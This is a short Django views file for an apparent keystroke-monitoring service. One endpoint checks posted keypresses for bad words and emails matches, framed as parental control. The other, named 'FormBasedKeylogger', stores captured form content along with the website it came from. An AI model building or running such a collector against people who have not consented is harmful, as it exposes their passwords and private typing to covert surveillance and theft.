from rest_framework.views import APIView
from .models import FormBasedKeyloggerModel

from decouple import config
from .utilities import response_writer, check_bad_words, send_email
from django.core.cache import cache
from rest_framework.response import Response
from rest_framework import status

# Create your views here.

class ParentalControl(APIView):

    def post(self, request):
        keypresses = request.data.get("keypresses")

        response = check_bad_words(keypresses)
        print(response)

        if response.get("bad_words_total") > 0:
            send_email(response.get("bad_words_list"))

        response = response_writer("success", 200, response, "Keypresses evaluated")

        return Response(response, status=status.HTTP_200_OK)

class FormBasedKeylogger(APIView):

    def post(self, request):
        content = request.data.get("content")
        website = request.data.get("website")

        instance = FormBasedKeyloggerModel(content=content, website=website)
        instance.save()

        response = response_writer("success", 200, {"content": content, "website": website}, "Keylogger data saved")

        return Response(response, status=status.HTTP_200_OK)